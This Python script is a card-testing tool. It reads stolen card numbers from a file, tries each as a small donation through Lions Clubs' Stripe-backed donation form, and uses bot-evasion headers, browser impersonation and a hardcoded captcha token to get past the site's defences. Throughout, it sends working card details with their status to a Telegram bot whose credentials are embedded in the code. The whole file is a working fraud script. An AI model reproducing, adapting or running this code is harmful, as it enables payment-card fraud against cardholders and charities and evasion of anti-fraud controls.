import requests,time,webbrowser,json,os,sys
import random,string,uuid,re,user_agent
from curl_cffi import requests
import cloudscraper
idacc = '1015595599'
token = '7679512170:AAFFyq9lGNlCfZZkTgI7Q428H6C36ZzlfBE'
user=user_agent.generate_user_agent()
combo = 'cc.txt'
#items = #['"chrome99"','"chrome100"','"chrome101"','"chrome104"','"chrome107"','"chrome110"','"chrome116"','"chrome119"','"chrome120"','"chrome123"','"chrome124"','"chrome131"','"safari15_3"','"safari15_5"','"safari17_0"','"safari17_2_ios"','"safari18_0"','"safari18_0_ios"','"edge99"','"edge101"','"chrome99_android"','"chrome131_android"'

#itemz = random.choice(items)
scraper = cloudscraper.create_scraper(
    # Challenge handling
    interpreter='js2py',        # Best compatibility for v3 challenges
    delay=5,                    # Extra time for complex challenges

    # Stealth mode
    enable_stealth=True,
    stealth_options={
        'min_delay': 2.0,
        'max_delay': 6.0,
        'human_like_delays': True,
        'randomize_headers': True,
        'browser_quirks': True
    }
)
file=open(f'{combo}',"+r")
start_num = 0
for P in file.readlines():
	start_num += 1
	n = P.split('|')[0]
	mm=P.split('|')[1]
	yy=P.split('|')[2][-2:]
	cvc=P.split('|')[3].replace('\n', '')
	P=P.replace('\n', '')
	#sessionId1 = generar_uuid()
	#Fingerprint1 = 
	#"".join(random.choice("0123456789abcdef") for _ in range(32))
	

	url = "https://m.stripe.com/6"
	headers = {
	    'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
  'Content-Type': "text/plain",
  'sec-ch-ua': "\"Chromium\";v=\"124\", \"Brave\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
  'sec-ch-ua-platform': "\"Android\"",
  'sec-ch-ua-mobile': "?1",
  'sec-gpc': "1",
  'accept-language': "en-GB,en;q=0.9",
  'origin': "https://m.stripe.network",
  'sec-fetch-site': "cross-site",
  'sec-fetch-mode': "cors",
  'sec-fetch-dest': "empty",
  'referer': "https://m.stripe.network/",
  'priority': "u=1, i"
	}

	payload = "JTdCJTIydjIlMjIlM0ExJTJDJTIyaWQlMjIlM0ElMjJkODVlNThhNmQwOTRlMzViMTExODI3YWY1Yjc0ZjE5NSUyMiUyQyUyMnQlMjIlM0E2MCUyQyUyMnRhZyUyMiUzQSUyMjQuNS40MyUyMiUyQyUyMnNyYyUyMiUzQSUyMmpzJTIyJTJDJTIyYSUyMiUzQSU3QiUyMmElMjIlM0ElN0IlMjJ2JTIyJTNBJTIyZmFsc2UlMjIlMkMlMjJ0JTIyJTNBMCU3RCUyQyUyMmIlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyZmFsc2UlMjIlMkMlMjJ0JTIyJTNBMCU3RCUyQyUyMmMlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyZW4tQ0ElMjIlMkMlMjJ0JTIyJTNBMCU3RCUyQyUyMmQlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyaVBob25lJTIyJTJDJTIydCUyMiUzQTAlN0QlMkMlMjJlJTIyJTNBJTdCJTIydiUyMiUzQSUyMlBERiUyMFZpZXdlciUyQ2ludGVybmFsLXBkZi12aWV3ZXIlMkNhcHBsaWNhdGlvbiUyRnBkZiUyQ3BkZiUyQiUyQnRleHQlMkZwZGYlMkNwZGYlMkMlMjBDaHJvbWUlMjBQREYlMjBWaWV3ZXIlMkNpbnRlcm5hbC1wZGYtdmlld2VyJTJDYXBwbGljYXRpb24lMkZwZGYlMkNwZGYlMkIlMkJ0ZXh0JTJGcGRmJTJDcGRmJTJDJTIwQ2hyb21pdW0lMjBQREYlMjBWaWV3ZXIlMkNpbnRlcm5hbC1wZGYtdmlld2VyJTJDYXBwbGljYXRpb24lMkZwZGYlMkNwZGYlMkIlMkJ0ZXh0JTJGcGRmJTJDcGRmJTJDJTIwTWljcm9zb2Z0JTIwRWRnZSUyMFBERiUyMFZpZXdlciUyQ2ludGVybmFsLXBkZi12aWV3ZXIlMkNhcHBsaWNhdGlvbiUyRnBkZiUyQ3BkZiUyQiUyQnRleHQlMkZwZGYlMkNwZGYlMkMlMjBXZWJLaXQlMjBidWlsdC1pbiUyMFBERiUyQ2ludGVybmFsLXBkZi12aWV3ZXIlMkNhcHBsaWNhdGlvbiUyRnBkZiUyQ3BkZiUyQiUyQnRleHQlMkZwZGYlMkNwZGYlMjIlMkMlMjJ0JTIyJTNBMSU3RCUyQyUyMmYlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyNDE0d184OTZoXzMyZF8zciUyMiUyQyUyMnQlMjIlM0EwJTdEJTJDJTIyZyUyMiUzQSU3QiUyMnYlMjIlM0ElMjItNCUyMiUyQyUyMnQlMjIlM0EwJTdEJTJDJTIyaCUyMiUzQSU3QiUyMnYlMjIlM0ElMjJ0cnVlJTIyJTJDJTIydCUyMiUzQTAlN0QlMkMlMjJpJTIyJTNBJTdCJTIydiUyMiUzQSUyMnNlc3Npb25TdG9yYWdlLWVuYWJsZWQlMkMlMjBsb2NhbFN0b3JhZ2UtZW5hYmxlZCUyMiUyQyUyMnQlMjIlM0ExJTdEJTJDJTIyaiUyMiUzQSU3QiUyMnYlMjIlM0ElMjIwMDAwMDEwMTAwMDAwMDAwMDAwMDAwMTExMTAwMDAwMDAwMDAwMDAwMDAxMDAwMDAwMTExMTEwJTIyJTJDJTIydCUyMiUzQTQ4JTJDJTIyYXQlMjIlM0EzJTdEJTJDJTIyayUyMiUzQSU3QiUyMnYlMjIlM0ElMjIlMjIlMkMlMjJ0JTIyJTNBMCU3RCUyQyUyMmwlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyTW96aWxsYSUyRjUuMCUyMChpUGhvbmUlM0IlMjBDUFUlMjBpUGhvbmUlMjBPUyUyMDE2XzRfMSUyMGxpa2UlMjBNYWMlMjBPUyUyMFgpJTIwQXBwbGVXZWJLaXQlMkY2MDUuMS4xNSUyMChLSFRNTCUyQyUyMGxpa2UlMjBHZWNrbyklMjBWZXJzaW9uJTJGMTYuNCUyME1vYmlsZSUyRjE1RTE0OCUyMFNhZmFyaSUyRjYwNC4xJTIyJTJDJTIydCUyMiUzQTAlN0QlMkMlMjJtJTIyJTNBJTdCJTIydiUyMiUzQSUyMiUyMiUyQyUyMnQlMjIlM0EwJTdEJTJDJTIybiUyMiUzQSU3QiUyMnYlMjIlM0ElMjJmYWxzZSUyMiUyQyUyMnQlMjIlM0EyMiUyQyUyMmF0JTIyJTNBMSU3RCUyQyUyMm8lMjIlM0ElN0IlMjJ2JTIyJTNBJTIyNDM3MmYzNWFlOWY4ODA1ZjdmMzNmZDEyNTRhZGQ2Y2ElMjIlMkMlMjJ0JTIyJTNBMTAlN0QlN0QlMkMlMjJiJTIyJTNBJTdCJTIyYSUyMiUzQSUyMmh0dHBzJTNBJTJGJTJGWF92V09wWVF3MnlpbVB6YTJsZGlsc3NaMVZnbEFoNlYzaHhrVFRja20xNC5GQll2RW9CaENvLWE3eGJncGtjSlp4YW5zMTlleHRjcHFBdm9TcVpmczVZLl9NMEd5d2g0TmdISlRVMUFqUGxnMDRRR2VRblF0b3ZkcTRuUzZCVG9nUXMlMkZXVy1leHFHbEVKOUIxZTRyZ0JwOW16dG9YNFdWODh1OTB1RDc2cmRuM21jJTIyJTJDJTIyYiUyMiUzQSUyMmh0dHBzJTNBJTJGJTJGWF92V09wWVF3MnlpbVB6YTJsZGlsc3NaMVZnbEFoNlYzaHhrVFRja20xNC5GQll2RW9CaENvLWE3eGJncGtjSlp4YW5zMTlleHRjcHFBdm9TcVpmczVZLl9NMEd5d2g0TmdISlRVMUFqUGxnMDRRR2VRblF0b3ZkcTRuUzZCVG9nUXMlMkZXVy1leHFHbEVKOUIxZTRyZ0JwOW16dG9YNFdWODh1OTB1RDc2cmRuM21jJTJGXzRHT2JGOERucEpiRkFRWS01OFpod21CakFNOVV3WXZTSC1ZQ2ZzbTdCZyUyMiUyQyUyMmMlMjIlM0ElMjJZQ3BhQm9MMkRSQUlXUDBoVGl0SXByUDdGc25ZUlgwQlo2VzU1b0gtaDQwJTIyJTJDJTIyZCUyMiUzQSUyMk5BJTIyJTJDJTIyZSUyMiUzQSUyMk5BJTIyJTJDJTIyZiUyMiUzQWZhbHNlJTJDJTIyZyUyMiUzQXRydWUlMkMlMjJoJTIyJTNBdHJ1ZSUyQyUyMmklMjIlM0ElNUIlMjJsb2NhdGlvbiUyMiU1RCUyQyUyMmolMjIlM0ElNUIlNUQlMkMlMjJuJTIyJTNBOTI2JTJDJTIydSUyMiUzQSUyMnd3dy5saW9uc2NsdWJzLm9yZyUyMiUyQyUyMnYlMjIlM0ElMjJ3d3cubGlvbnNjbHVicy5vcmclMjIlMkMlMjJ3JTIyJTNBJTIyMTczMDM5Njg3MDg3NSUzQTEzOGNkMDRlMjg1ZmVhMTM5YTcwYTE3MDAxMzBjNWZkM2NmNDI2NDQ4MjAxYmM1YzQ0OTBiZjY5N2U3MTU0ZmYlMjIlN0QlMkMlMjJoJTIyJTNBJTIyZmZiNDcyNzM3NTlkNGRlNWUwZWUlMjIlN0Q="
	response = requests.post(url, data=payload, headers=headers)
	#print(response.text)
	muid=(response.json()["muid"])
	sid=(response.json()["sid"])
	guid=(response.json()["guid"])
	
	#print(response.text)
	
	headers = {
    'Host': 'www.lionsclubs.org',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'X-Requested-With': 'XMLHttpRequest',
    'Sec-Fetch-Site': 'same-origin',
    'Accept-Language': 'en-GB,en;q=0.9',
    'Sec-Fetch-Mode': 'cors',
    'Origin': 'https://www.lionsclubs.org',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1',
    'Referer': 'https://www.lionsclubs.org/en/donate?err=donation_error',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'empty',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
     'Cookie': f"nav=public; __stripe_mid={muid}; __stripe_sid={sid}"
}

	params = {
    'ajax_form': "1",
  '_wrapper_format': "drupal_ajax"
}

	data = {
    'campaign': '1',
    'is_this_a_recurring_gift_': 'One-Time-Gift',
    'how_much_would_you_like_to_donate_': '20',
    'donate_amount': '',
    'who_is_this_gift_from_': 'lion',
    'business_name': '',
    'club_or_district_name': '',
    'club_or_district_id': '',
    'first_name': 'Heldjjd',
    'last_name': 'Bjshbs',
    'email_address_2': 'bagsujiet5576756@gmail.com',
    'phone_number_optional': '5043337657',
    'address[address]': 'Logaund',
    'address[address_2]': '',
    'address[postal_code]': '10090',
    'address[city]': 'New york',
    'address[country]': 'United States',
    'address[state_province]': 'New York',
    'address_provinces_canada': '',
    'address_states_india': '',
    'sponsoring_lions_club_name': '',
    'sponsoring_lions_club_id': '',
    'club_name': 'Hshshs',
    'club_id': '',
    'member_id_optional_': '',
    'is_this_an_anonymous_gift_': 'no',
    'recognition_request': 'no recognition',
    'recognition_name': '',
    'recognition_plaque_display': '',
    'recognition_club_name': '',
    'recognition_member_id': '',
    'recognition_message': '',
    'special_instructions': '',
    'recognition_shipping_first_name': '',
    'recognition_shipping_last_name': '',
    'recognition_shipping_phone': '',
    'recognition_shipping_address[address]': '',
    'recognition_shipping_address[address_2]': '',
    'recognition_shipping_address[postal_code]': '',
    'recognition_shipping_address[city]': '',
    'recognition_shipping_address[country]': '',
    'recognition_shipping_address[state_province]': '',
    'shipping_address_provinces_in_canada': '',
    'shipping_address_states_india': '',
    'recognition_shipping_comments': '',
    'how_would_you_like_to_pay_': 'credit-card',
    'name_on_card': 'Hehe jdjdihs',
    'stripe_card[payment_intent]': '',
    'stripe_card[client_secret]': '',
    'stripe_card[trigger]': '1744054602709',
    'leave_this_field_blank': '',
    'url_redirection': '',
    'form_build_id': 'form-2UMZdaTcjTaNM41oDtYO-53ncn-QYLw8nwnsP1vjY4o',
    'form_id': 'webform_submission_donation_paragraph_34856_add_form',
    'antibot_key': 'B7N6p5OEzhElwYbQ63su_hzatGXEpYwx7fLMuSVftNs',
    'form_instance_id': '67f428e93f2d3',
    '_triggering_element_name': 'stripe-stripe_card-button',
    '_triggering_element_value': 'Update',
    '_drupal_ajax': '1',
    'ajax_page_state[theme]': 'lionsclubs',
    'ajax_page_state[theme_token]': '',
    'ajax_page_state[libraries]': 'eJyFUFtywyAMvBAxR2IElgmpjKgk0uT2xeM0bZNm-qPHrp4L1Upk87D7aWFZXUQzlICXxopzWAqNVH3GigLk0hvOxVgCpMQyF67-Hk2LcDWss0tMLJEvfsYFOtkdCKVSqegf8sEL-jKapQJNp_eOct3vSV2N15Cox0CcYOz2f2AuM2fCYJB9HuYxn-AEl9_g6mgcrUGZJCiCpKP_Ed_YcxHrQCFxPeMQajxMqRzUpDQ8nHQv204ZIhHHoVEDgSzQjupn6W089I1MvbYeqegRZ7cvCtBKgG6ceG2Ehv4F7valfndOr2q4-giKzmJYMcOKtT8DaldCdR8YN0X9zU_bWNYy5j4ySDgabZrRoJBOCuf_i4zz0PZl2YqqkF_z3DZtn6_84nUEyZ7ozXwCj_UYIQ',
}

	response = requests.post(
    'https://www.lionsclubs.org/en/donate',
    params=params,
    headers=headers,
    data=data,
    impersonate="safari_ios"
)
	#print(response.text)
	if 'payment_intent' in response.text:
		int1 =(response.text.split('"payment_intent":')[1].split('"')[1])
	else:
		print(  "Declined ❌")

		#time.sleep(25)
		continue
    
	#print(f"{int1}")
	response=str(response.cookies)
	#print(response)
	#cooki = cok[:-31]
	#cookie = cooki[-47:]
	#if 'SESS6c0a823fe8db15d3696b98638b5200b7' in cookie :
		#kok=f'S{cookie}'
	#else:
		#kok=cookie
	cookie=response.split(' for ')[0].split('<Cookie ')[1]
	#print(f"{int1}")
	#print(cookie)
	url = "https://api.stripe.com/v1/payment_methods"
	payload = f"type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid={guid}&muid={muid}&sid={sid}&pasted_fields=number&payment_user_agent=stripe.js%2Ff28ec4bf5e%3B+stripe-js-v3%2Ff28ec4bf5e%3B+card-element&referrer=https%3A%2F%2Fwww.lionsclubs.org&time_on_page=97333&key=pk_live_gaSDC8QsAaou2vzZP59yJ8S5&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiRkdLVE9XZ3VkbkVsaEFraEhEcEd6RHdZZUJBVkNZYkwrbmkzbDh6bzd2Y3hYYW5IVFNpQkIzWGFKVkpGbW9DbCtRRXU3RGlGb3J3Z011aFQ1VkM5dTlSODY5N2ZPNEFXRDh2U0NzbVd0NW4xU0xIUTd0M1Y3VTZSV0o5L0FKTjBaQ2tYd3ZrSVNBeC9oRnJVd0d1TE5INTVBQklzYVA2RDhFcTV5OTFHQmJUck4xcVpGaGVuN3htZlY2UU9lV3NhclFYbktxc0pXa1BkVk1VODJvYldZZ0lIeFdiR1Z0T051U29ENjk3bjhEeGhOVEp3Uktta3ljU0JKY0FyR2cvVy96dU9RVGZndFZ2dlhMd203aU9mN1pmbTQzZmR5ak1EdFBGZDc1clNCTVRhbkkxUlJySUVvMjdTMUQ3Ull1WEo2OVRyWXk3amJKUDFGS2hEaHBiSkZGQUlTNGxFd09HdXNtMndqV2M2aHozaG5WdFRWUkVFQUx4eEdmekV6d3JmYUxaK0NiNzVDUm0yOEpib1RpUVQ5dHBaQXk4OFdYdm1BcjZRajU0cjhJVlFBZmUxanQydThrY2tkOUpHVUNSQW13dUlZYWZxaE4zQWJWblBQTVV3UC9CemgvSXQ0V3dxNkx4ek9BQXRHajY2anQwa08xRWtkQncxalFSQmRCK29kM1o3dmNQc2lYejE0YWI1R1VEZDJPK3NxbkZ5MXd2V1VyL0hZeDBLSDRGQVpIaXhEdnZvNGloNlZPTUxWYW1QcTZYNm41VG1OL0lhVTE3QmUzMGN1Qng2WWFpS0xyblZJTERvVWNSVmdkb0VBeXRFRzBnbExoRU1oVjdxSGVIL3F3VlFha1RESVdVQmRGMFVLci9oZ3YybDU2NEp5MTRrKzBvRVRtMDFNRi81WmJ6bWdpM0NubEZzbzc2VHlQbXd1YVd4S1pqTnI3VzA4MjZ4ZzZScEcrbVdJc3RJTkM0N0dFNmF1QWtBdUNMaUxrVkVTRWNTVlRFOUpNL3Y3TVJ2Q1lJUzgwd2dkaG9YZDhqRldVU245c3NGYlVoa2lLV2VtOS9pUGR2NEdxdm84SDYyS1Z5S3pualRoS0J5VXk5SlFYNk1lL2puUmNrckMwTktDYkZyT3RtanljdHVSY2dQVU0xUktzVWVqNFhhSWZ4T0lTU014NE1EaTdVMVVZZUhaNDBaK05tSDFDSE9XOXBsdUN4ZVI0cC9Zak95SGw2VXdMVk1waWFBQVRRWDk0VDdCMllrSHM4M2JzdjQ2b3J5b1NONCt5SU5nT0xhZWs2aGdlVXp0MTNJVjF1bGs2STJtYlUzL1NBSUJCeVVxSStlT3pHdHBnM0VMRk5leVNmVTZsNG5TOUl0SzgvdVp3czRGV0xGWGpJREdMYjFrZVM0NmMzeDI2T2QrdHViUlVkaHAzaU90aFF3QWpSN3BkNFVEWnRJaG1YOENVY2F5NzZuOEdDRmhvYWtYSllweUk4Z3JEZjRGVVZuekg0VmFuUXNQRUgrUmkzZnZHL0FsOE1hVy9QMkUzRlhpUGRtbitKVlA2UmhweVhVTFRhdnhzZFBiZUovcC80dSsrdnY1c1BLTGJTdURGeFZFa1l1M1VQamJ0V0ZzYzdnWHlQWEF1YzdqcmUwckFDdWtpcWcvNkVKaVVtVWYwZENpTE82Q2h0TEtERUxZaW5lU3hGQkkvVFdqTk4wSkNpMUMwRThvYlptSVhmTUlKaUNDamlBT2NFcCtuQ01BTEJRMERsUDFKUmo2a1dTL0VDMzhIRENsOHE4ZU5tZ3VsTVVZZ3JNNDV0bzBxZnZlZERyckYyVWxhRzNEZnVITy80Ti8vdE4xMUpPcmZRUG1CdzFuRXlMWDFaeEZtUXJIQkloYU5QVHNqUDdBcEp1c2tyNHp4cjBySGJLZi90N1ZqWXBGem81SGdzaDRHUXhKRTZYa1VhUXlsbXFaQU91d0JQUVUrWHF2MkRDRWRZamd5cjRQQWdOdmhOWmdhMVlqNWlMYVU1TzRQaytZcEkrRUVNTzE0dHRCelBpQ1A2a0tNNmc4TDc3cmhqM2RFRTlqeDBKNUtUMFFEYm9Ib3pHMERVZ0hRS1lmU3JBZnUxSzYzMjZ4RUkvUG5OQ1BBOG4xMU5KbXdxZUxUQXdzQ1ZiS1ZUaWdVbzZMcFZhZzZ3UzVCK2hORHU3bllaNjRXL21EMitXR2Fvbm8xMzhSeFphMjhTQjlmTGVIMVpINVRuYXFiYTVneEVKTzhyK0FpU0VtR2dMNzFPbi8za1V2SXRJSUlJZ2FNd0wyYmUvQzVESTRnRkxVUFIzZk1MbEt2MGVZeWZJZGw2RHluUmpWSmxWSE1TVGcvVFVBaDlHSy9jcGZBakVaTDRQSDZIcUQzRFR1blJDcnpSM29KMjBjeGhrcXM5UmhOTEt0cmRYZG4vRTR3Mm04YUpINjNGVlVPWFQ3MjQ1eTBJVEZLRC90Z2VNY1dtYnhLTEtISklDUFo5VVQ1YjdQdFdabE5MUWM0UGl3Y1gycFpRSUZYUHpvK3BSUFIvZURLUHN2TG45QjhPbERvY21oVGIySjdBWG9mc3d3eGRRQ2FOSGdjTTJjYy9Sbkd1aWZkTUFOMUZ5VzN6ZVFURERSQVVLajlZMXRyS0tsRkR2TEV6RElWOG1KMHlsaVM0T3FXemZRTFNCK2Y5Um5TOGhoWGc2aHBnaDJQZzZxY2NTREdxMUdrUU13ZnZhWFNseCtGSklwY3QvQmRZc1VKc25VNmJZV1FkeTFWcjRWVlNKVnZoRWRkL3ZoL1ZMdTJMZnJrblZOZktmTHBlcWZNQnhFdjJEWVoyazJhMDYiLCJleHAiOjE3NDQwNTQ2MzgsInNoYXJkX2lkIjo1MzU3NjU1OSwia3IiOiI0MDc2NDIwZiIsInBkIjowLCJjZGF0YSI6InJLbWFJbWpsV1dRLysraTl2RjdRTmZtbncyaHlENWpXSm1wTjBVSHM5NS9BMlliSFM5L2ZKbHVoRzFGVjJUeDZpc0dNUkwycks0L213bnlOV0EyeG1TSjU4NjdWR2o4NTNQOU1BMEROd3ZaQnN4UVJFTmV6S21YUDVCdk50YWhmVnI5N1FxYzM5WkJMYWd6WWRYUGxjQkVIZHdLVVZqdXpaWFBhdTA2VTd4Z1hHZWs5c1h6OUtLZkJONWtyTmYrdll3VTFTNTdBYVorMzNqT1YifQ.N1NIPu-kxLk6gVCAjV9Hu_MkDlFFswSVsLaOEiDi9Pk"
	headers = {
		'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
	  'Accept': "application/json",
	  'Accept-Encoding': "gzip, deflate, br, zstd",
	  'Content-Type': "application/x-www-form-urlencoded",
	  'sec-ch-ua': "\"Chromium\";v=\"124\", \"Brave\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-gpc': "1",
	  'accept-language': "en-GB,en;q=0.9",
	  'origin': "https://js.stripe.com",
	  'sec-fetch-site': "same-site",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://js.stripe.com/",
	  'priority': "u=1, i"
	}
	response = requests.post(url, data=payload, headers=headers)
	if 'pm_' in response.text:
		pm=(response.json()['id'])
	#client = ZenRowsClient("0977db92f9790cba21f26aaedadec5d6336720c5")
	url = "https://www.lionsclubs.org/lions_payment/method_id"

	headers = {
	'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
		  'Accept': "application/json",
		  'Accept-Encoding': "gzip, deflate, br, zstd",
		  'Content-Type': "application/json",
		  'sec-ch-ua': "\"Chromium\";v=\"124\", \"Brave\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		  'sec-ch-ua-mobile': "?1",
		  'sec-ch-ua-platform': "\"Android\"",
		  'sec-gpc': "1",
		  'accept-language': "ar-EG,ar;q=0.9",
		  'origin': "https://www.lionsclubs.org",
		  'sec-fetch-site': "same-origin",
		  'sec-fetch-mode': "cors",
		  'sec-fetch-dest': "empty",
		  'referer': "https://www.lionsclubs.org/en/donate",
		  'priority': "u=1, i",
		  'Cookie': f"__stripe_mid={muid}; __stripe_sid={sid}; {cookie}"
}
	json_data = {
	'paymentMethodId': pm,
    'paymentintent': int1,
    'currentPath': '/node/13261',
}

	response = requests.post(url, headers=headers, json=json_data, impersonate="safari")
	#print(response.text)
	if 'clientSecretKey' in response.text:
		
		csc = response.json()['clientSecretKey']
	else:
		print(  "Declined ❌❌")

		continue
	#print(f"{csc}")
	
	url = f"https://api.stripe.com/v1/payment_intents/{int1}/confirm"
	payload = f"payment_method={pm}&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_gaSDC8QsAaou2vzZP59yJ8S5&client_secret={csc}"
	headers = {
		'Host': 'api.stripe.com',
    'Accept': 'application/json',
    'Sec-Fetch-Site': 'same-site',
    'Accept-Language': 'en-CA,en-US;q=0.9,en;q=0.8',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Sec-Fetch-Mode': 'cors',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://js.stripe.com',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
    'Referer': 'https://js.stripe.com/',
    # 'Content-Length': '208',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'empty',
	}
	response = requests.post(url, data=payload, headers=headers)
	
	if 'requires_source_action' in response.text:
		status=(response.json()["status"])
		tr=response.text.split('"server_transaction_id": ')[1].split('"')[1]
		pyc=response.text.split('"three_d_secure_2_source": ')[1].split('"')[1]
	else:
		mess = response.json()['error']['message']
		print( f"[{start_num}] {P} -> {mess}  ❌❌❌")

		#print(response.text)   
		continue
	cod='{"threeDSServerTransID":"'+tr+'"}'
	url = "https://www.base64encode.org"
	payload = f'input={cod}&charset=UTF-8&separator=lf'
	headers = {
		'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/605.1",
			  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
			  'Accept-Encoding': "gzip, deflate, br, zstd",
			  'Content-Type': "application/x-www-form-urlencoded",
			  'cache-control': "max-age=0",
			  'sec-ch-ua': "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
			  'sec-ch-ua-mobile': "?1",
			  'sec-ch-ua-platform': "\"Android\"",
			  'upgrade-insecure-requests': "1",
			  'origin': "https://www.base64encode.org",
			  'sec-fetch-site': "same-origin",
			  'sec-fetch-mode': "navigate",
			  'sec-fetch-user': "?1",
			  'sec-fetch-dest': "document",
			  'referer': "https://www.base64encode.org/",
			  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
			  'priority': "u=0, i",
	}
	response = requests.post(url, data=payload, headers=headers)
	data=(response.text.split('spellcheck="false">')[2].split('<')[0])
	url = "https://api.stripe.com/v1/3ds2/authenticate"
	payload = f'source={pyc}&browser=%7B%22fingerprintAttempted%22%3Atrue%2C%22fingerprintData%22%3A%22{data}%22%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-GB%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22852%22%2C%22browserScreenWidth%22%3A%22393%22%2C%22browserTZ%22%3A%22-120%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(iPhone%3B+CPU+iPhone+OS+17_4_1+like+Mac+OS+X)+AppleWebKit%2F605.1.15+(KHTML%2C+like+Gecko)+Version%2F17.4.1+Mobile%2F15E148+Safari%2F605.1%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=false&key=pk_live_gaSDC8QsAaou2vzZP59yJ8S5'
	headers = {
		'User-Agent': user,
			  'Accept': "application/json",
			  'Accept-Encoding': "gzip, deflate, br, zstd",
			  'Content-Type': "application/x-www-form-urlencoded",
			  'sec-ch-ua': "\"Chromium\";v=\"124\", \"Brave\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
			  'sec-ch-ua-mobile': "?1",
			  'sec-ch-ua-platform': "\"Android\"",
			  'sec-gpc': "1",
			  'accept-language': "en-GB,en;q=0.9",
			  'origin': "https://js.stripe.com",
			  'sec-fetch-site': "same-site",
			  'sec-fetch-mode': "cors",
			  'sec-fetch-dest': "empty",
			  'referer': "https://js.stripe.com/",
			  'priority': "u=1, i"
	}
	response = scraper.post(url, data=payload, headers=headers)
	r23=response.text
	if 'challenge_required' in response.text:
		print(f"[{start_num}] {P} ->|3d socure✅")
		requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={idacc}&text=[{start_num}] {P} 3d socure ✅')
		scraper.close()

		time.sleep(60)
	elif 'succeeded' in response.text:
		print(f"[{start_num}] {P} ->|Approved succeeded 🎯🎯🎯")
		scraper.close()

		requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={idacc}&text=[{start_num}] {P} Approved succeeded  🎯🎯🎯')
		time.sleep(60)
	elif 'attempted' in response.text:
		print(f"[{start_num}] {P} ->|attempted success 🚀🚀🚀")
		scraper.close()

		requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={idacc}&text=[{start_num}] {P} attempted success 🚀🚀🚀')
		time.sleep(60)
	elif 'processing_error'  in response.text:
 		#state=(response.json()['state'])
		print(f"[{start_num}] {P} -> ERROR ❌")
		#open('processing_error.txt','a').write(f'{n[:6]};'+'\n')
		scraper.close()

		time.sleep(60)
		
	
		scraper.close()
	else:
		print(f"[{start_num}] {P} -> {r23}❌")
		time.sleep(60)
		scraper.close()
